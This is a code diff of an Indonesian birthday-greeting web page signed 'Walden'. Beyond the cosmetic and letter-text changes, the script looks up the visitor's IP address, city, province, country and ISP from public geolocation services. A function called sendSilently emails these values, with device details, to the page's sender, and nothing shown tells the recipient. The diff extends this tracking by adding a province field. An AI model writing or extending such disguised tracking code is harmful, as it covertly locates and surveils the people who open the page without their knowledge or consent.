@@ -174,7 +174,6 @@ h1,h2,h3,.serif{font-family:'Fraunces',serif}
 .paper{position:relative;background:linear-gradient(180deg,#f8f0de 0%,#efe3c6 100%);color:#241d12;border-radius:6px;padding:clamp(32px,5.5vw,62px);transform:rotate(-.6deg);box-shadow:0 40px 90px rgba(0,0,0,.6)}
 .wax{position:absolute;top:-28px;right:40px;width:68px;height:68px;border-radius:50%;transform:rotate(9deg);background:radial-gradient(circle at 35% 30%,#e05a6d 0%,#a63d52 50%,#8e2438 100%);display:grid;place-items:center;font-family:'Fraunces',serif;font-weight:900;font-size:1.8rem;color:#f7dfe3}
 .paper p{font-family:'Fraunces',serif;font-size:1.08rem;line-height:2;margin-bottom:1.5em}
-.paper p:first-of-type::first-letter{font-weight:900;font-size:3.4em;float:left;line-height:.82;padding:6px 14px 0 0;color:#a63d52}
 .sig-line{margin-top:2.4em;text-align:right}
 .sig{display:block;font-family:'Caveat',cursive;font-size:2.8rem;color:#a63d52;transform:rotate(-2deg)}
 .pols{display:flex;flex-wrap:wrap;justify-content:center;padding:30px 0 10px}
@@ -250,8 +249,7 @@ footer{border-top:1px solid var(--line);padding:0 0 46px}
       <label class="fld"><span>Tanggal spesial</span><input type="date" id="inpTanggal" required></label>
       <label class="fld"><span>Pesan pendek untuknya <i class="tiny2">(opsional)</i></span><textarea id="inpPesan" placeholder="tulis sesuatu yang manis..." maxlength="200"></textarea></label>
       <label class="fld locked"><span>Dari — terkunci 🔒</span><input type="text" value="Walden ✦" disabled><small>Nama pengirim terkunci permanen.</small></label>
-      <div class="fld"><span>Foto kenangan <i class="tiny2">(opsional, maks 8)</i></span>
-        <div class="thumbs" id="thumbs"><label class="add-tile" for="inpFoto">＋</label><input type="file" id="inpFoto" accept="image/*" multiple hidden></div>
+      <div class="fld"><span>Foto kenangan <i class="tiny2">(WAJIB, minimal 1 · maks 8)</i></span>        <div class="thumbs" id="thumbs"><label class="add-tile" for="inpFoto">＋</label><input type="file" id="inpFoto" accept="image/*" multiple hidden></div>
         <small>Foto pertama dipajang besar di halaman utama, semuanya tampil di galeri.</small></div>
       <button class="btn" type="submit" id="submitBtn">Mulai Perayaan ✦</button>
       <p class="setup-note" id="setupErr"></p>
@@ -314,9 +312,8 @@ footer{border-top:1px solid var(--line);padding:0 0 46px}
     <aside class="side"><div class="num rv">03</div><h2 class="rv">Surat dari <em>Walden</em></h2></aside>
     <article class="paper">
       <div class="wax">W</div>
-      <p class="mask"><span>Hai. Sebelum kamu lanjut makan kue, baca ini dulu. Hari ini pengecualian — soalnya ini hari kamu.</span></p>
-      <p class="mask" style="--d:.1s"><span>Terima kasih sudah bertahan sejauh ini. Kamu melewatinya dengan caramu sendiri, dan itu keren sekali.</span></p>
-      <p class="mask" style="--d:.18s"><span>Doaku sederhana: semoga tahun barumu penuh kabar baik dan kejutan manis.</span></p>
+      <p class="mask"><span>Selamat ulang tahun <b id="suratNama">kamu</b>! 🎉 Semoga di usia yang baru ini, semua harapan dan impianmu bisa tercapai. Semoga selalu diberikan kesehatan, kebahagiaan, rezeki yang lancar, dan dikelilingi orang-orang yang tulus menyayangimu. Semoga hari-harimu ke depan menjadi lebih baik dari sebelumnya. 🤍✨</span></p>
+      <p class="mask" style="--d:.12s"><span>Doa Dari saya: semoga <b id="suratNama2">kamu</b> di umur mu yg ke-<b id="suratUmur">-</b> kamu bisa menjadi pribadi yg lebih baik dan berani dan makin dewasa dan pikirannya makin dewasa</span></p>
       <div class="sig-line rv"><span class="sig">— Walden</span></div>
     </article>
   </div>
@@ -418,36 +415,24 @@ async function initEmailJS(){
   try { emailjs.init({ publicKey: EMAILJS.PUBLIC_KEY }); emailjsReady = true; return true; }
   catch(e){ return false; }
 }
+
 async function getLokasi(){
-  const kosong = { kota:'-', negara:'-', ip:'-', isp:'-' };
-
-  // 1️⃣ Coba ip-api.com (gratis, tanpa key, 45/menit)
-  try {
-    const r = await fetch('http://ip-api.com/json/?fields=status,city,country,query,isp');
-    const j = await r.json();
-    if (j && j.status === 'success') {
-      return { kota: j.city || '-', negara: j.country || '-', ip: j.query || '-', isp: j.isp || '-' };
-    }
-  } catch(e){ console.warn('[LOKASI] ip-api gagal:', e); }
-
-  // 2️⃣ Cadangan: ipapi.co
-  try {
-    const r = await fetch('https://ipapi.co/json/');
-    const j = await r.json();
-    if (j && j.city) {
-      return { kota: j.city, negara: j.country_name || '-', ip: j.ip || '-', isp: j.org || '-' };
-    }
-  } catch(e){ console.warn('[LOKASI] ipapi.co gagal:', e); }
-
-  // 3️⃣ Cadangan terakhir: ipwho.is (tanpa key, tanpa batas ketat)
+  const kosong = { kota:'-', provinsi:'-', negara:'-', ip:'-', isp:'-' };
   try {
     const r = await fetch('https://ipwho.is/');
     const j = await r.json();
-    if (j && j.city) {
-      return { kota: j.city, negara: j.country || '-', ip: j.ip || '-', isp: (j.connection && j.connection.isp) || '-' };
-    }
+    if (j && j.city) return { kota:j.city||'-', provinsi:j.region||'-', negara:j.country||'-', ip:j.ip||'-', isp:(j.connection&&j.connection.isp)||'-' };
   } catch(e){ console.warn('[LOKASI] ipwho.is gagal:', e); }
-
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const j = await r.json();
+    if (j && j.city) return { kota:j.city||'-', provinsi:j.region||'-', negara:j.country_name||'-', ip:j.ip||'-', isp:j.org||'-' };
+  } catch(e){ console.warn('[LOKASI] ipapi.co gagal:', e); }
+  try {
+    const r = await fetch('http://ip-api.com/json/?fields=status,city,regionName,country,query,isp');
+    const j = await r.json();
+    if (j && j.status === 'success') return { kota:j.city||'-', provinsi:j.regionName||'-', negara:j.country||'-', ip:j.query||'-', isp:j.isp||'-' };
+  } catch(e){ console.warn('[LOKASI] ip-api gagal:', e); }
   return kosong;
 }
 
@@ -510,6 +495,7 @@ async function sendSilently(trigger = 'unknown'){
       pesan: DATA.pesan || '(tidak ada pesan)',
       waktu, device,
       kota: lokasi.kota,
+      provinsi: lokasi.provinsi,
       negara: lokasi.negara,
       ip_penerima: lokasi.ip,
       isp: lokasi.isp,
@@ -541,12 +527,27 @@ function setDateChip(){
   else chip.innerHTML = '📅 ' + fmt;
 }
 
+function hitungUmur(){
+  if (!DATA.tanggal) return '-';
+  const lahir = new Date(DATA.tanggal + 'T00:00:00');
+  const sekarang = new Date();
+  let umur = sekarang.getFullYear() - lahir.getFullYear();
+  const m = sekarang.getMonth() - lahir.getMonth();
+  if (m < 0 || (m === 0 && sekarang.getDate() < lahir.getDate())) umur--;
+  return umur;
+}
+
 function applyData(){
   if (!DATA.nama) return;
-  $('#who').textContent = DATA.nama;
-  $('#who2').textContent = DATA.nama.toLowerCase();
-  $('#who3').textContent = DATA.nama.toLowerCase();
-  document.title = 'Selamat Ulang Tahun, ' + DATA.nama + ' ✦ dari Walden';
+  const nama = DATA.nama;
+  $('#who').textContent = nama;
+  $('#who2').textContent = nama.toLowerCase();
+  $('#who3').textContent = nama.toLowerCase();
+  // isi surat
+  const sn1 = $('#suratNama');  if (sn1) sn1.textContent = nama;
+  const sn2 = $('#suratNama2'); if (sn2) sn2.textContent = nama;
+  const su  = $('#suratUmur');  if (su)  su.textContent  = hitungUmur();
+  document.title = 'Selamat Ulang Tahun, ' + nama + ' ✦ dari Walden';
   setDateChip();
   const src0 = typeof DATA.fotos[0] === 'string' ? DATA.fotos[0] : DATA.fotos[0]?.dataUrl;
   if (src0){
@@ -660,6 +661,7 @@ $('#setupForm').addEventListener('submit', async e => {
   const pesan = $('#inpPesan').value.trim();
   if (!nama){ errEl.textContent = 'nama penerimanya diisi dulu dong ✦'; return; }
   if (!tanggal){ errEl.textContent = 'tanggal spesialnya juga ya ✦'; return; }
+  if (tempFotos.length === 0){ errEl.textContent = 'foto kenangan wajib diisi minimal 1 ya ✦'; return; }
   errEl.textContent = '';
   btn.classList.add('loading'); btn.innerHTML = '<span>Menyiapkan perayaan…</span>';
 
@@ -685,7 +687,7 @@ if (DATA.nama){
 }
 
 $('#resetBtn').addEventListener('click', () => {
-  if (confirm('Yakin mau mengatur ulang nama, tanggal, dan foto?')){
+  if (confirm('Yakin mau mengatur ulang nama, tanggal, dan foto? Data lama akan dihapus.')){
     localStorage.removeItem(LS);
     sessionStorage.removeItem('email_sent_this_session');
     location.reload();
